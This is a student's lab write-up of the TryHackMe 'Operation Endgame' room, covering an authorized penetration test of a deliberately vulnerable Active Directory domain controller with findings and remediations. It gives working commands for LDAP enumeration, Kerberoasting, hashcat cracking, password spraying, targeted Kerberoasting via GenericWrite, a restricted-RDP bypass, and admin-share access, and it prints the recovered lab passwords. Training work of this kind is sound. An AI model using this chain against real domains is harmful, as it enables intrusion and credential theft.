# TryHackMe — Operation Endgame (Active Directory Penetration Test)

**Name:**   NUR ALEA BATRISYIA BINTI MOHD FADZLY
**Class / Section:** L01-B03
**Course:** BCT
**Date:** 28/11/2026

> **Scope & authorization:** All testing was performed against the TryHackMe room
> *Operation Endgame*, a deliberately vulnerable lab machine reached only through my
> own TryHackMe OpenVPN connection. No third-party, production, or unauthorized system
> was touched.

---

## 1. Target Setup (Victim)

| Item | Value |
|------|-------|
| Platform | TryHackMe — Operation Endgame v1.7 |
| Target IP | `10.48.158.84` |
| Hostname | `AD` (`ad.thm.local`) |
| Role | Domain Controller |
| Domain | `thm.local` (NetBIOS: `THM`) |
| OS | Windows Server 2019 (Build 17763 x64) |
| Hosting | AWS EC2 `t3a.medium`, ap-south-1a |
| Key services | DNS 53, Kerberos 88, LDAP 389, SMB 445, RDP 3389 |
| SMB signing | True |

![Target machine](images/00-target-machine.png)

---

## 2. Attacker Host (Own Host)

| Item | Value |
|------|-------|
| Machine / OS | Kali Linux on WSL2 (host: DESKTOP-B3HQ7HK) |
| Shell | ZSH |
| VPN | OpenVPN — TryHackMe Asia Pacific (Mumbai) |
| VPN interface | `tun0` — `192.168.182.210/18` |
| Tools used | nmap, ldapsearch, NetExec (nxc), hashcat, targetedKerberoast, FreeRDP 3, smbclient, Internet Explorer (on target) |

**VPN setup:**
```bash
sudo apt install -y openvpn
cp "/mnt/d/Users/Nitro RTX/Downloads/<thm-config>.ovpn" ~/thm.ovpn
sudo openvpn ~/thm.ovpn     # wait for "Initialization Sequence Completed"
export ip=10.48.158.84
echo "10.48.158.84 thm.local ad.thm.local" | sudo tee -a /etc/hosts
```

**Troubleshooting:** The first scan showed every port as *filtered*. This was because the VPN
was not connected yet (THM showed *Not connected*, virtual IP `0.0.0.0`). The host only
appeared "up" because `-Pn` skips host discovery. After I connected OpenVPN inside WSL,
`tun0` came up and the AD ports showed as open.

![VPN not connected](images/01-vpn-not-connected.png)
![Nmap — all ports filtered before VPN](images/02-nmap-filtered.png)
![tun0 up and AD ports open](images/03-vpn-tun0-nmap-open.png)

---

## 3. Methodology

1. **Reconnaissance**: port scan to identify the host as an AD Domain Controller.
2. **Enumeration**: anonymous LDAP to build a domain user list.
3. **Credential access**: Kerberoasting as Guest, offline cracking, password spraying.
4. **Privilege escalation (AD)**: abuse of an ACL (GenericWrite) for targeted Kerberoasting.
5. **Lateral movement**: RDP as a low-privileged user; local enumeration for secrets.
6. **Domain compromise**: hardcoded Domain Admin credentials, then the admin share (C$) and the flag.

**Attack chain:**
```
Anonymous LDAP ──► Guest Kerberoast ──► CODY_ROY (cracked)
      ──► Password reuse ──► ZACHARY_HUNT
      ──► GenericWrite ──► Targeted Kerberoast ──► JERRI_LANCASTER (cracked)
      ──► RDP ──► C:\Scripts\syncer.ps1 ──► SANFORD_DAUGHERTY (Domain Admin)
      ──► C$ ──► flag
```

---

## 4. Findings

### Finding 1: Anonymous LDAP Bind → Domain User Enumeration (Medium)

- **Location:** LDAP `389/tcp` on the Domain Controller.
- **Description:** The DC accepts unauthenticated (anonymous) LDAP queries, so anyone can list domain user objects.
- **Exploitation:**
```bash
ldapsearch -x -H ldap://$ip -b "DC=thm,DC=local" "(objectClass=user)" sAMAccountName \
  | grep sAMAccountName | awk '{print $2}' > users.txt
sed -i '/requesting:/d' users.txt
```
→ **333** account names were recovered with no credentials.
- **Impact:** This gives an attacker a ready-made target list for Kerberoasting and password spraying.

**Evidence:**
![LDAP user enumeration](images/04-ldap-user-enum.png)

---

### Finding 2: Kerberoasting via Guest Account → CODY_ROY (High)

- **Location:** Kerberos `88/tcp`, LDAP `389/tcp`.
- **Description:** The built-in **Guest** account is enabled with an empty password. Any authenticated
  user can request a TGS ticket for an account that has a Service Principal Name (SPN). That ticket is
  encrypted with the account's password hash, so it can be cracked offline.
- **Exploitation:**
```bash
nxc ldap $ip -u guest -p '' --kerberoasting cody.hash
hashcat -m 13100 cody.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 cody.hash --show
```
→ This returned an RC4 (etype 23) TGS hash for `CODY_ROY`, who is a member of **Remote Desktop Users**.
Hashcat cracked it in about **1 second**.
- **Credential recovered:** `CODY_ROY : MKO)mko0`
- **Impact:** The Guest account alone is enough to get a valid domain user password.

**Evidence:**
![Kerberoast as Guest](images/05-kerberoast-guest.png)
![Hashcat — cracked](images/06-hashcat-cody-cracked.png)
![CODY_ROY password](images/07-cody-password.png)

---

### Finding 3: Password Reuse → ZACHARY_HUNT (High)

- **Description:** The cracked password was weak, so I tested it against the other users. A second
  account uses the exact same password.
- **Exploitation:**
```bash
nxc smb $ip -u users.txt -p 'MKO)mko0' --continue-on-success | grep '[+]'
nxc smb $ip -u ZACHARY_HUNT -p 'MKO)mko0'
```
- **Observation:** The spray against the LDAP-derived list only found `CODY_ROY`, because
  `ZACHARY_HUNT` was not in the anonymously enumerated list. The only "Zachary" in it was
  `ZACHARY_HAMMOND`. Testing the account directly confirmed it was valid. This shows anonymous
  LDAP gave an incomplete user list. RID brute-forcing as Guest
  (`nxc smb $ip -u guest -p '' --rid-brute`) would have produced a complete list.
- **Credential recovered:** `ZACHARY_HUNT : MKO)mko0`
- **Impact:** One cracked password compromised several accounts.

**Evidence:**
![Password spray (SMB)](images/08-password-spray-smb.png)
![ZACHARY_HUNT valid](images/09-zachary-valid.png)

---

### Finding 4: Excessive ACL (GenericWrite) → Targeted Kerberoasting → JERRI_LANCASTER (High)

- **Description:** `ZACHARY_HUNT` has **GenericWrite** over the user `JERRI_LANCASTER`
  (an attack path BloodHound shows). GenericWrite lets the attacker write a fake SPN to the
  target account, request a TGS for it, and then remove the SPN. This makes any user Kerberoastable.
- **Exploitation:**
```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast ~/tk
python3 ~/tk/targetedKerberoast.py -d thm.local -u ZACHARY_HUNT -p 'MKO)mko0' \
  --dc-ip $ip --request-user JERRI_LANCASTER -o jerri.hash
hashcat -m 13100 jerri.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 jerri.hash --show
```
→ Hashcat cracked the hash in under 3 seconds.
- **Credential recovered:** `JERRI_LANCASTER : lovinlife!`
- **Impact:** A misconfigured permission let a normal user take over another user's account.

**Evidence:**
![Targeted Kerberoast](images/10-targeted-kerberoast.png)
![Hashcat — cracked](images/11-hashcat-jerri-cracked.png)
![JERRI_LANCASTER password](images/12-jerri-password.png)

---

### Finding 5: Hardcoded Domain Admin Credentials in Script (Critical)

- **Location:** `C:\Scripts\syncer.ps1` on the Domain Controller.
- **Access:**
```bash
xfreerdp3 /u:JERRI_LANCASTER /p:'lovinlife!' /d:thm.local /v:$ip /cert:ignore /dynamic-resolution
```
- **Restricted desktop bypass:** The RDP session was restricted. `Win + R` was captured by
  the host, and there was no direct access to cmd or Explorer. I bypassed this by opening
  **Internet Explorer** and browsing to `file:///C:/Scripts/syncer.ps1`, which opened the
  script in Notepad.
- **Content:**
```powershell
$Username = "SANFORD_DAUGHERTY"
$Password = ConvertTo-SecureString "RESET_ASAP123" -AsPlainText -Force
Sync-ADObject -Object "DC=thm,DC=local" -Source "ad.thm.local" -Destination "ad2.thm.local" -Credential $Credential
```
- **Credential recovered:** `SANFORD_DAUGHERTY : RESET_ASAP123`
- **Impact:** A plaintext Domain Admin password could be read by a low-privileged user.

**Evidence:**
![RDP as JERRI_LANCASTER](images/13-rdp-jerri.png)
![syncer.ps1 hardcoded credentials](images/14-syncer-hardcoded-creds.png)

---

### Finding 6: Domain Compromise → Flag (Critical)

- **Verification:**
```bash
nxc smb $ip -u SANFORD_DAUGHERTY -p 'RESET_ASAP123'
```
→ `(Pwn3d!)`: local admin rights on the Domain Controller.
- **Flag retrieval:** I first tried remote command execution with
  `nxc ... -x 'type ...'`. It ran via wmiexec, but the output could not be retrieved.
  I switched to downloading the file directly from the admin share:
```bash
smbclient //$ip/C$ -U 'thm.local\SANFORD_DAUGHERTY%RESET_ASAP123' \
  -c 'cd Users\Administrator\Desktop; ls; get flag.txt.txt flag.txt'
cat flag.txt
```
- **Flag:** `THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}`
- **Impact:** Full compromise of the domain.

**Evidence:**
![SANFORD_DAUGHERTY Pwn3d](images/15-sanford-pwned.png)
![wmiexec — no output](images/16-wmiexec-no-output.png)
![Flag](images/17-flag.png)

---

## 5. Credentials Summary

| Account | Password | Obtained via | Privilege |
|---------|----------|--------------|-----------|
| Guest | *(empty)* | Default / enabled | Authenticated domain access |
| CODY_ROY | `MKO)mko0` | Kerberoast + hashcat | Remote Desktop Users |
| ZACHARY_HUNT | `MKO)mko0` | Password reuse | GenericWrite on JERRI_LANCASTER |
| JERRI_LANCASTER | `lovinlife!` | Targeted Kerberoast + hashcat | RDP to DC |
| SANFORD_DAUGHERTY | `RESET_ASAP123` | Hardcoded in `syncer.ps1` | **Domain Admin** |

---

## 6. Limitations

- I used a public walkthrough (see References) as a guide for the overall attack path. All commands were run and verified on my own instance, and I solved several differences from the walkthrough myself: a VPN that was not connected, an incomplete LDAP user list, a restricted RDP desktop, and wmiexec output failure.
- BloodHound collection was not run in this session. The GenericWrite edge was confirmed by successfully exploiting it.
- AS-REP roasting and other paths (e.g. ADCS on `443`, CA `thm-LABYRINTH-CA`) were not assessed.
- I did not attempt persistence or full credential dumping (NTDS.dit / DCSync). The objective was the flag.

---

## 7. Interpretation & Analysis

- **Anonymous LDAP + Guest (Findings 1–2):** Two small misconfigurations together give an
  unauthenticated attacker a user list *and* a way to request Kerberos tickets.
- **Weak / reused passwords (Findings 2–4):** Every cracked password was in `rockyou.txt` and broke in
  seconds. RC4 tickets make Kerberoasting fast.
- **ACL abuse (Finding 4):** Excessive AD permissions are hard to see without tooling and turn one user
  into another.
- **Secrets in scripts (Finding 5):** This was the decisive step. A plaintext Domain Admin password on the
  DC itself meant the whole domain fell.

**Recommended remediations:**

| Finding | Fix |
|---------|-----|
| Anonymous LDAP | Disable anonymous binds (`dSHeuristics`); restrict null sessions. |
| Guest Kerberoast | Disable the Guest account; use gMSAs or 25+ char random passwords for SPN accounts; disable RC4 (AES only). |
| Password reuse | Enforce a strong password policy, block breached/common passwords (e.g. Azure AD Password Protection), and monitor for spraying (event 4771/4625 spikes). |
| GenericWrite ACL | Audit ACLs regularly with BloodHound/PingCastle; remove unnecessary write rights; alert on SPN changes (event 5136). |
| Hardcoded creds | Never store credentials in scripts; use gMSA, Windows Credential Manager, or a secrets vault; rotate SANFORD_DAUGHERTY's password. |
| Domain compromise | Tiered admin model; limit Domain Admin membership; use LAPS and Protected Users group. |

---

## 8. References

- TryHackMe — Operation Endgame room — https://tryhackme.com/
- Walkthrough used as a guide — https://edbertsumicad.medium.com/tryhackme-operation-endgame-9f5fb4429c2f
- MITRE ATT&CK T1558.003 Kerberoasting — https://attack.mitre.org/techniques/T1558/003/
- MITRE ATT&CK T1110.003 Password Spraying — https://attack.mitre.org/techniques/T1110/003/
- MITRE ATT&CK T1552.001 Credentials in Files — https://attack.mitre.org/techniques/T1552/001/
- targetedKerberoast — https://github.com/ShutdownRepo/targetedKerberoast
- NetExec — https://github.com/Pennyw0rth/NetExec
